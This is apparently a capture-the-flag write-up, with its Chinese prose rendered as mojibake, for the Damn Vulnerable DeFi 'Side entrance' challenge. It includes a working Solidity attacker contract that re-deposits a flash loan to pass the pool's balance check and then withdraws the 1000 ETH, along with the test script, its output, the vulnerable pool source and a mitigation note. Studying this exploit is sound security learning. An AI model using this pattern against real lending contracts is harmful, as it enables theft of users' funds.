# ðª Challenge #4 - Side entrance å´é

![https://i.imgur.com/ElYSFA7.png](https://i.imgur.com/ElYSFA7.png)

A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.

This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.

You must take all ETH from the lending pool.

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/side-entrance)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/side-entrance/side-entrance.challenge.js)

é¡ç®èªªæä¸ååè²¸æ± æä¾åè²» [[FlashLoan]] åè²¸çæåï¼æåçç®æ¨æ¯å°æ± å­è£¡ç 1000 ETH æ­¸çµ¦ attacker

## åç´ç è®ï¼å°æ¾æ»æé»

- é¦åè§å¯ä¸ä¸flashLoan ç functionï¼æç¼ç¾åºæ¬ä¸æååªè¦æ³è¾¦æ³è® Balance ç¶­æä¸æ¨£å°±å¯ä»¥ä¸ç¨éé¢ï¼é£æåæè¾¦æ³æé¢ä¸æ¨£çå¨æ± å­è£¡é¢ï¼ä½æ¯æ¹è®æææ¬åï¼

```solidity
    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        // â¨ å¯ä»¥è®å¤é¨ç¨åä¾çé¢åä»»ä½äº
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require( //  å¯ä»¥æ³è¾¦æ³è®é¤é¡ä¸è®ï¼å°±å¯ä»¥ä¸ç¨éé¢ â¨
            address(this).balance >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
```

- åå¾ä¸çå¯ä»¥çå°æææ¬¾ãå­æ¬¾çåè½ï¼æ¯æåå¯ä»¥æ¹è®é¤é¡ãè½é¢çµ¦èªå·±çå¥å£ãæä»¥æåå¯ä»¥ä½¿ç¨åç´ç¼åæ»æï¼å¨ `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` ç¶ä¸­å­é¢å° `SideEntranceLenderPool` ç¶ä¸­ï¼éæ¨£é¤é¡ä¸æè®ï¼ä¸ balance çæææ¬ä¹å¯ä»¥è®ææåèªå·±ã

```solidity
    function deposit() external payable {
        balances[msg.sender] += msg.value; //  â¨ å¯ä»¥æ¹è®é¤é¡
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw); //  â¨ å¯ä»¥è½é¢çµ¦èªå·±
    }
```

## å¯¦ç¾æ»æ

### å¯¦ç¾ IFlashLoanEtherReceiver æ»æåç´

- å¯«ä¸åå¯¦ç¾ IFlashLoanEtherReceiver çåç´
- å¯¦ç¾ execute ä¸­ deposit çµ¦ poolï¼è® pool ä»¥çºåç´é¤é¡æ²æè®å°±æ¯å·²éæ¬¾
- å¯¦ç¾å¯ä»¥æ¶æ¬¾ãææ¬¾çåè½

```mermaid
sequenceDiagram
  actor Attacker
  autonumber
    Attacker->>ReceiverAttackerSideEntrance: deploy
    Attacker->>ReceiverAttackerSideEntrance: attack
  rect rgb(191, 223, 255)
  note right of ReceiverAttackerSideEntrance: Attack Flow
  ReceiverAttackerSideEntrance->>SideEntranceLenderPool:flashLoan
  SideEntranceLenderPool--) ReceiverAttackerSideEntrance: ecucute
  ReceiverAttackerSideEntrance--) SideEntranceLenderPool: deposit(ä»£æ¿éæ¬¾)
  SideEntranceLenderPool--)SideEntranceLenderPool: OK, æª¢æ¥é¤é¡æ²è®
  end
  rect rgb(191, 223, 200)
  note right of ReceiverAttackerSideEntrance: Withdraw Flow
    Attacker->>ReceiverAttackerSideEntrance: withdraw
    ReceiverAttackerSideEntrance->>SideEntranceLenderPool: withdraw
  SideEntranceLenderPool-->>ReceiverAttackerSideEntrance: value
  ReceiverAttackerSideEntrance-->>Attacker: value
  end
```

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./SideEntranceLenderPool.sol";
import "@openzeppelin/contracts/utils/Address.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract ReceiverAttackerSideEntrance is IFlashLoanEtherReceiver {
    SideEntranceLenderPool pool;
    using Address for address payable;
    address owner;

    constructor(address _pool) {
        owner = msg.sender;
        pool = SideEntranceLenderPool(_pool);
    }

    function execute() external payable override {
        pool.deposit{value: 1000 ether}();
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw(uint amount) external {
        pool.withdraw();
        require(owner == msg.sender);
        payable(msg.sender).sendValue(amount);
    }

    fallback() external payable {}
}

```

### æ»¿è¶³æ¸¬è©¦

```jsx
    it('Exploit', async function () {
        const receiverAttacker = await (await ethers.getContractFactory('ReceiverAttackerSideEntrance', attacker)).deploy(this.pool.address);
        await receiverAttacker.attack( ETHER_IN_POOL );
        await receiverAttacker.withdraw(ETHER_IN_POOL);
    });
```

```
  [Challenge] Side entrance
    â Exploit (131ms)

  1 passing (1s)

â¨  Done in 4.92s.
```

## ð§ ç¸½çµ & ä¿®æ¹æ¹å¼

[æå¼ä¾è®å æ»æ](https://www.so/2a0407b1936b4540a1b45c930e346336)

- **å¼±é»ï¼** éé¡å±¬æ¼ [[æå¼ä¾è®å æ»æ]]ï¼
- **æ»æï¼** ééæ pool å¨ [[FlashLoan]] åçµ¦æåçé¢å¨éæ°å­å pool ééäº pool æ¬èº«ç `address(this).balance >= balanceBefore` æª¢æ¥
- **æ¹é²ï¼** é£è¦æéº¼ç¢ºä¿æéé¢ï¼èä¸éé¢çä¸å®æ¯ä½¿ç¨èï¼AAVE ç FlashLoan å·²ç¶æä¾çµ¦æåè§£æ³ï¼å°±æ¯è®åè²¸èå approve ç¶å¾ pool åç´æ¬èº«å transferFromï¼éæ¨£å°±å¯ä»¥ç¢ºä¿ï¼æåä¸å®å¾åè²¸æ¹æ½åäºåè²¸è²»ç¨ã AAVE æç´æ¥å¨[æä»¶](https://docs.aave.com/developers/guides/flash-loans#completing-the-flash-loan)ç¶ä¸­èªªæ ï¼ > You **do not** need to transfer the owed amount back to the `Pool`. The funds will be automatically *pulled* at the conclusion of your operation.

åè²¸èéäºå approve æ¬¾é ï¼AAVE V3 ä½¿ç¨safeTransferFromåä½¿ç¨èæ½åè²»ç¨ï¼æèä½¿ç¨èä¹å¯ä»¥[ä½¿ç¨æµæ¼åä¾éé¢](https://github.com/aave/aave-v3-core/blob/master/contracts/protocol/libraries/logic/FlashLoanLogic.sol#L132)ã

## 4.4 å®æ´åç´

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/utils/Address.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SideEntranceLenderPool {
    using Address for address payable;

    mapping(address => uint256) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value; //  â¨ å¯ä»¥æ¹è®é¤é¡
    }

    function withdraw() external {
        uint256 amountToWithdraw = balances[msg.sender];
        balances[msg.sender] = 0;
        payable(msg.sender).sendValue(amountToWithdraw); //  â¨ å¯ä»¥è½é¢çµ¦èªå·±
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        require(balanceBefore >= amount, "Not enough ETH in balance");
        // â¨ å¯ä»¥è®å¤é¨ç¨åä¾çé¢åä»»ä½äº
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        require( //  å¯ä»¥æ³è¾¦æ³è®é¤é¡ä¸è®ï¼å°±å¯ä»¥ä¸ç¨éé¢ â¨
            address(this).balance >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}

```
